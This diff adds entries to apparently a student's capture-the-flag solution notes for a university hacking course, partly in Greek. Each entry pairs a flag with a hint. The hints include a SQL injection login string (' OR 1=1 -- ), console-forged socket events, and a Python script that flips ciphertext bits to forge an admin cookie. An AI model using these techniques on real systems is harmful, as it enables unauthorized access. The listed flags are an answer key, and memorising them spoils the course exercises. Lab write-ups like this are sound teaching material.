@@ -102,6 +102,47 @@ Image.fromarray(xor_img.astype(np.uint8)).save("xor_result.bmp")
 
 print("Saved xor_result.bmp")
 -----------------------------------------------------------------------------------------------
+challenge: #Blob Quest 0
+solution:  lazer_917bb9987a
+hint: F12 > Πηγές > shell.hackintro25.di.uoa.gr:53430
+> js > client.js > Client.sendPosition = function (x, y) {
+    Client.socket.emit('moved', {x:x, y:y});
+}; (συνάρτηση) > Κονσόλα > copy paste: Client.socket.emit('moved', {x:168, y:84})
+> το flag εμφανίζεται στο παιχνίδι
+-----------------------------------------------------------------------------------------------
+challenge: #Sequels are the worst
+solution:  ac022cd445ae072d2dc8c3d2bbcd31fd
+hint: Username:' OR 1=1 -- 
+Password:' OR 1=1 -- 
+-----------------------------------------------------------------------------------------------
+challenge: #Cooking 3
+solution:  
+hint: /logout στο url > username: guest
+password: guest > F12 > Εφαρμογή > http:/shell.hackintro.di.uoa.gr:55924
+> auth > 4ce5eea3406a696e5bd93642d227810432831d5b4e393881f44c410aa6c47df357cbb203745961571826e6047e0215082e3eb4b229f5d4da66bbb1b43b07b5b775f3
+> το βάζω στο παρακάτω αρχείο python: (forge new cookie)
+from binascii import unhexlify, hexlify
+
+cookie = "4ce5eea3406a696e5bd93642d227810432831d5b4e393881f44c410aa6c47df357cbb203745961571826e6047e0215082e3eb4b229f5d4da66bbb1b43b07b5b775f3"
+
+iv = cookie[:32]
+ct = bytearray(unhexlify(cookie[32:]))
+
+plaintext = '{"user": "guest", "password": "guest", "admin": 0}'
+
+idx = plaintext.index("0")
+
+print("offset =", idx)
+
+# flip 0 -> 1
+ct[idx] ^= ord('0') ^ ord('1')
+
+new_cookie = iv + hexlify(ct).decode()
+
+print(new_cookie)
+> 4ce5eea3406a696e5bd93642d227810432831d5b4e393881f44c410aa6c47df357cbb203745961571826e6047e0215082e3eb4b229f5d4da66bbb1b43b07b5b774f3
+> copy paste > refresh
+-----------------------------------------------------------------------------------------------
 challenge: #Nonsense
 solution: a5f25f42b84a006b20bafeaf071d3771
 hint: ssh dimitriskaragiannis36@shell.hackintro.di.uoa.gr
